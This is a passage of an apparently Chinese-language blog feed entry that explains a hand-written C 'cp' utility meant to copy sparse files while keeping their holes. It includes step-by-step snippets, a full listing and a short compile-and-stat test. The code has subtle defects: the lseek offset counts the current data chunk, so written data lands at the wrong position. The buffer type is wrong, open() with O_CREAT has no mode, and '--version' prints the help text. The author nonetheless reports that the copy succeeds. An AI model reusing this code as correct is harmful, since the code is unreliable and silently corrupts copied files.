class="line"><span class="type">void</span> <span class="title function_">fileErrClose</span><span class="params">(<span class="type">const</span> <span class="type">char</span> * filename, <span class="type">const</span> <span class="type">char</span> *err, <span class="type">int</span> exitCode)</span> &#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *errstr = strerror(errno);</span><br><span class="line">    writeErr(<span class="string">&quot;Error: &quot;</span>);</span><br><span class="line">    writeErr(errstr);</span><br><span class="line">    writeErr(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    writeErr(err);</span><br><span class="line">    writeErr(filename);</span><br><span class="line">    writeErr(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(exitCode);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">printHelp</span><span class="params">()</span> &#123;</span><br><span class="line">    writeStdout(<span class="string">&quot;Usage: cp [--help][--version][src dest]\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">printVersion</span><span class="params">()</span> &#123;</span><br><span class="line">    writeStdout(<span class="string">&quot;Written by Jingtian Meow\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">writeStdout</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* str)</span> &#123;</span><br><span class="line">    errno = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> writeSize = write(STDOUT_FILENO, str, <span class="built_in">strlen</span>(str));</span><br><span class="line">    <span class="keyword">if</span>(writeSize == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="type">char</span> *errstr = strerror(errno);</span><br><span class="line">        writeErr(<span class="string">&quot;Error: &quot;</span>);</span><br><span class="line">        writeErr(errstr);</span><br><span class="line">        writeErr(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        writeErr(<span class="string">&quot;fail to write to stdout\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(STDOUT_WRITE_FAIL);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">writeErr</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* str)</span> &#123;</span><br><span class="line">    errno = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> writeSize = write(STDERR_FILENO, str, <span class="built_in">strlen</span>(str));</span><br><span class="line">    <span class="keyword">if</span>(writeSize == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="built_in">exit</span>(STDERR_WRITE_FAIL);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="参数处理-1"><a href="#参数处理-1" class="headerlink" title="参数处理"></a>参数处理</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span> &#123;</span><br><span class="line">    <span class="comment">// src文件，dest文件</span></span><br><span class="line">    <span class="type">char</span> *filesrc = <span class="literal">NULL</span>, *filedest = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 处理参数</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt; argc; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span>(argv[i][<span class="number">0</span>] == <span class="string">&#x27;-&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">strcmp</span>(argv[i], <span class="string">&quot;--help&quot;</span>) || <span class="built_in">strcmp</span>(argv[i], <span class="string">&quot;-h&quot;</span>)) &#123;</span><br><span class="line">                printHelp();</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">strcmp</span>(argv[i], <span class="string">&quot;--version&quot;</span>) || <span class="built_in">strcmp</span>(argv[i], <span class="string">&quot;-v&quot;</span>)) &#123;</span><br><span class="line">                printHelp();</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                writeErr(<span class="string">&quot;Unsupported arg: &quot;</span>);</span><br><span class="line">                writeErr(argv[i]);</span><br><span class="line">                writeErr(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">                <span class="built_in">exit</span>(UNSUPPORTED_ARG);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span>(filesrc == <span class="literal">NULL</span>) &#123;</span><br><span class="line">                filesrc = argv[i];</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(filedest == <span class="literal">NULL</span>) &#123;</span><br><span class="line">                filedest = argv[i];</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                writeErr(<span class="string">&quot;Invalid arguments: &quot;</span>);</span><br><span class="line">                writeErr(argv[i]);</span><br><span class="line">                writeErr(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">                <span class="built_in">exit</span>(INVALID_ARG);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// other part ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不允许<code>-r</code>等操作，只允许对文件进行复制</p><h3 id="文件打开"><a href="#文件打开" class="headerlink" title="文件打开"></a>文件打开</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">errno = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> srcFd = open(filesrc, O_RDONLY);</span><br><span class="line"><span class="keyword">if</span>(srcFd == <span class="number">-1</span>) &#123;</span><br><span class="line">    fileErrClose(filesrc, <span class="string">&quot;Can not open file: &quot;</span>, FILE_OPEN_FAIL);</span><br><span class="line">&#125;</span><br><span class="line">errno = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> descFd = open(filedest, O_WRONLY | O_TRUNC | O_CREAT);</span><br><span class="line"><span class="keyword">if</span>(descFd == <span class="number">-1</span>) &#123;</span><br><span class="line">    fileErrClose(filedest, <span class="string">&quot;Can not open file: &quot;</span>, FILE_OPEN_FAIL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分别打开输入和输出文件</p><h3 id="文件读写"><a href="#文件读写" class="headerlink" title="文件读写"></a>文件读写</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> * readBuffer[READ_BUFF_SIZE+<span class="number">1</span>];</span><br><span class="line"><span class="type">char</span> allzero[READ_BUFF_SIZE+<span class="number">1</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="type">off_t</span> offdest = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">    errno = <span class="number">0</span>;</span><br><span class="line">    <span class="type">ssize_t</span> readSize = read(srcFd, readBuffer, READ_BUFF_SIZE);</span><br><span class="line">    <span class="keyword">if</span>(readSize == <span class="number">-1</span>) &#123;</span><br><span class="line">        fileErrClose(filesrc, <span class="string">&quot;Can not read file: &quot;</span>, FILE_READ_FAIL);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">#<span class="keyword">ifdef</span> debug</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;readsize = %ld\n&quot;</span>, readSize);</span><br><span class="line">    <span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="keyword">if</span>(readSize == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="meta">#<span class="keyword">ifdef</span> debug</span></span><br><span class="line">        writeStdout(<span class="string">&quot;Read finish\n&quot;</span>);</span><br><span class="line">        <span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    readBuffer[readSize] = <span class="number">0</span>;</span><br><span class="line">    offdest += readSize;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">memcmp</span>(readBuffer, allzero, readSize) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="meta">#<span class="keyword">ifdef</span> debug</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;hole, readsize = %ld, off = %ld\n&quot;</span>, readSize, offdest);</span><br><span class="line">        <span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(offdest &gt; <span class="number">0</span>)lseek(descFd, offdest, SEEK_CUR);</span><br><span class="line">    offdest = <span class="number">0</span>;</span><br><span class="line">    errno = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> writeSize = write(descFd, readBuffer, readSize);</span><br><span class="line">    <span class="keyword">if</span>(writeSize == <span class="number">-1</span>) &#123;</span><br><span class="line">        fileErrClose(filedest, <span class="string">&quot;Write Fail on file: &quot;</span>, FILE_WRITE_FAIL);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(writeSize &lt; readSize) &#123;</span><br><span class="line">        fileErrClose(filedest, <span class="string">&quot;Partial write occured on file: &quot;</span>, PARTIAL_WRITE_OCCURED);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>当某次读出数据全为0时，则此处是空洞，记录空洞的累计长度</li><li>直到某次读取不全为0时，空洞结束，先lseek空洞长度，再写入</li></ul><h3 id="善后"><a href="#善后" class="headerlink" title="善后"></a>善后</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">errno = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(close(srcFd) == <span class="number">-1</span>) &#123;</span><br><span class="line">    fileErrClose(filesrc, <span class="string">&quot;Can not close file: &quot;</span>, FILE_CLOSE_FAIL);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">errno = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(close(descFd) == <span class="number">-1</span>) &#123;</span><br><span class="line">    fileErrClose(filedest, <span class="string">&quot;Can not close file: &quot;</span>, FILE_CLOSE_FAIL);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure><h3 id="复制文件"><a href="#复制文件" class="headerlink" title="复制文件"></a>复制文件</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc cp.c -o <span class="built_in">cp</span> &amp;&amp; ./cp abc abc.cp</span><br><span class="line"><span class="built_in">stat</span> -c %b abc.cp</span><br></pre></td></tr></table></figure><p>编译该cp工具，使用它复制带有空洞文件，可发现其成功复制，并输出块数也为16</p><h3 id="完整代码-1"><a href="#完整代码-1" class="headerlink" title="完整代码"></a>完整代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// #define debug</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> debug</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> bool char</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> false 0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> true 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> strcmp(a,b) strcmp(a,b)==0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// exit code</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> UNSUPPORTED_ARG 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FILE_OPEN_FAIL 2</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STDOUT_WRITE_FAIL 3</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STDERR_WRITE_FAIL 4</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STDIN_READ_FAIL 5</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PARTIAL_WRITE_OCCURED 6</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FILE_CLOSE_FAIL 7</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FILE_WRITE_FAIL 8</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FILE_READ_FAIL 10</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> INVALID_ARG 9</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数声明</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">printHelp</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">printVersion</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">writeErr</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* str)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">writeStdout</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* str)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">fileErrClose</span><span class="params">(<span class="type">const</span> <span class="type">char</span> * filename, <span class="type">const</span> <span class="type">char</span> *err, <span class="type">int</span> exitCode)</span>; </span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> READ_BUFF_SIZE 1023</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span> &#123;</span><br><span class="line">    <span class="comment">// src文件，dest文件</span></span><br><span class="line">    <span class="type">char</span> *filesrc = <span class="literal">NULL</span>, *filedest = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 处理参数</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt; argc; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span>(argv[i][<span class="number">0</span>] == <span class="string">&#x27;-&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">strcmp</span>(argv[i], <span class="string">&quot;--help&quot;</span>) || <span class="built_in">strcmp</span>(argv[i], <span class="string">&quot;-h&quot;</span>)) &#123;</span><br><span class="line">                printHelp();</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">strcmp</span>(argv[i], <span class="string">&quot;--version&quot;</span>) || <span class="built_in">strcmp</span>(argv[i], <span class="string">&quot;-v&quot;</span>)) &#123;</span><br><span class="line">                printHelp();</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                writeErr(<span class="string">&quot;Unsupported arg: &quot;</span>);</span><br><span class="line">                writeErr(argv[i]);</span><br><span class="line">                writeErr(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">                <span class="built_in">exit</span>(UNSUPPORTED_ARG);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span>(filesrc == <span class="literal">NULL</span>) &#123;</span><br><span class="line">                filesrc = argv[i];</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(filedest == <span class="literal">NULL</span>) &#123;</span><br><span class="line">                filedest = argv[i];</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                writeErr(<span class="string">&quot;Invalid arguments: &quot;</span>);</span><br><span class="line">                writeErr(argv[i]);</span><br><span class="line">                writeErr(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">                <span class="built_in">exit</span>(INVALID_ARG);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    errno = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> srcFd = open(filesrc, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span>(srcFd == <span class="number">-1</span>) &#123;</span><br><span class="line">        fileErrClose(filesrc, <span class="string">&quot;Can not open file: &quot;</span>, FILE_OPEN_FAIL);</span><br><span class="line">    &#125;</span><br><span class="line">    errno = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> descFd = open(filedest, O_WRONLY | O_TRUNC | O_CREAT);</span><br><span class="line">    <span class="keyword">if</span>(descFd == <span class="number">-1</span>) &#123;</span><br><span class="line">        fileErrClose(filedest, <span class="string">&quot;Can not open file: &quot;</span>, FILE_OPEN_FAIL);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> * readBuffer[READ_BUFF_SIZE+<span class="number">1</span>];</span><br><span class="line">    <span class="type">char</span> allzero[READ_BUFF_SIZE+<span class="number">1</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">off_t</span> offdest = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">        errno = <span class="number">0</span>;</span><br><span class="line">        <span class="type">ssize_t</span> readSize = read(srcFd, readBuffer, READ_BUFF_SIZE);</span><br><span class="line">        <span class="keyword">if</span>(readSize == <span class="number">-1</span>) &#123;</span><br><span class="line">            fileErrClose(filesrc, <span class="string">&quot;Can not read file: &quot;</span>, FILE_READ_FAIL);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">#<span class="keyword">ifdef</span> debug</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;readsize = %ld\n&quot;</span>, readSize);</span><br><span class="line">        <span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">        <span class="keyword">if</span>(readSize == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="meta">#<span class="keyword">ifdef</span> debug</span></span><br><span class="line">            writeStdout(<span class="string">&quot;Read finish\n&quot;</span>);</span><br><span class="line">            <span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        readBuffer[readSize] = <span class="number">0</span>;</span><br><span class="line">        offdest += readSize;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">memcmp</span>(readBuffer, allzero, readSize) == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="meta">#<span class="keyword">ifdef</span> debug</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;hole, readsize = %ld, off = %ld\n&quot;</span>, readSize, offdest);</span><br><span class="line">            <span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(offdest &gt; <span class="number">0</span>)lseek(descFd, offdest, SEEK_CUR);</span><br><span class="line">        offdest = <span class="number">0</span>;</span><br><span class="line">        errno = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> writeSize = write(descFd, readBuffer, readSize);</span><br><span class="line">        <span class="keyword">if</span>(writeSize == <span class="number">-1</span>) &#123;</span><br><span class="line">            fileErrClose(filedest, <span class="string">&quot;Write Fail on file: &quot;</span>, FILE_WRITE_FAIL);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(writeSize &lt; readSize) &#123;</span><br><span class="line">            fileErrClose(filedest, <span class="string">&quot;Partial write occured on file: &quot;</span>, PARTIAL_WRITE_OCCURED);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    errno = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(close(srcFd) == <span class="number">-1</span>) &#123;</span><br><span class="line">        fileErrClose(filesrc, <span class="string">&quot;Can not close file: &quot;</span>, FILE_CLOSE_FAIL);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    errno = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(close(descFd) == <span class="number">-1</span>) &#123;</span><br><span class="line">        fileErrClose(filedest, <span class="string">&quot;Can not close file: &quot;</span>, FILE_CLOSE_FAIL);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">fileErrClose</span><span class="params">(<span class="type">const</span> <span class="type">char</span> * filename, <span class="type">const</span> <span class="type">char</span> *err, <span class="type">int</span> exitCode)</span> &#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *errstr = strerror(errno);</span><br><span class="line">    writeErr(<span class="string">&quot;Error: &quot;</span>);</span><br><span class="line">    writeErr(errstr);</span><br><span class="line">    writeErr(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    writeErr(err);</span><br><span class="line">    writeErr(filename);</span><br><span class="line">    writeErr(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(exitCode);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">printHelp</span><span class="params">()</span> &#123;</span><br><span class="line">    writeStdout(<span class="string">&quot;Usage: cp [--help][--version][src dest]\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">printVersion</span><span class="params">()</span> &#123;</span><br><span class="line">    writeStdout(<span class="string">&quot;Written by Jingtian Meow\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">writeStdout</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* str)</span> &#123;</span><br><span class="line">    errno = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> writeSize = write(STDOUT_FILENO, str, <span class="built_in">strlen</span>(str));</span><br><span class="line">    <span class="keyword">if</span>(writeSize == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="type">char</span> *errstr = strerror(errno);</span><br><span class="line">        writeErr(<span class="string">&quot;Error: &quot;</span>);</span><br><span class="line">        writeErr(errstr);</span><br><span class="line">        writeErr(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        writeErr(<span class="string">&quot;fail to write to stdout\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(STDOUT_WRITE_FAIL);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">writeErr</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* str)</span> &#123;</span><br><span class="line">    errno = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> writeSize = write(STDERR_FILENO, str, <span class="built_in">strlen</span>(str));</span><br><span class="line">    <span class="keyword">if</span>(writeSize == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="built_in">exit</span>(STDERR_WRITE_FAIL);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;实现tee&quot;&gt;&lt;a href=&quot;#实现tee&quot; class=&quot;headerlink&quot; title=&quot;实现tee&quot;&gt;&lt;/a&gt;实现tee&lt;/h2&gt;&lt;blockquote&gt;
